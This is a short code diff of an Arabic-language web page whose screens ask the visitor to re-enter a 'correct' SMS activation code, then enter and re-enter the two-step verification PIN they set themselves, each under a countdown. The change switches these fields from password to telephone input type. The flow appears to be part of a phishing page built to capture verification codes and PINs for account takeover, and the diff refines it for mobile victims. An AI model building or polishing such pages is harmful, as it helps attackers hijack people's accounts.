@@ -159,7 +159,7 @@
                 container.innerHTML = `
                     <h1>رمز التفعيل الصحيح</h1>
                     <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.</p>
-                    <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
+                    <input id="activationCode2" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
                 `;
@@ -181,7 +181,7 @@
                 container.innerHTML = `
                     <h1>التحقق من خطوتين</h1>
                     <p>أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق على خطوتين..</p>
-                    <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
+                    <input id="pinCode1" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <a href="#" class="forgot-link">هل نسيت رقم التعريف الشخصي</a>
                     <p class="instruction">
                         لقد قمت بإنشاء رمز PIN الخاص بك بنفسك. هذا ليس رمز التحقق الذي تلقيته عند التسجيل.
@@ -207,7 +207,7 @@
                 container.innerHTML = `
                     <h1>إعادة رمز PIN</h1>
                     <p>يرجى إعادة إدخال رمز PIN المكون من 6 أرقام لتأكيد الدخول.</p>
-                    <input id="pinCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
+                    <input id="pinCode2" class="pin-input" type="tel" maxlength="6" placeholder="••••••">
                     <button onclick="submitSecondPin()">متابعة</button>
                     <div id="countdown"></div>
                 `;
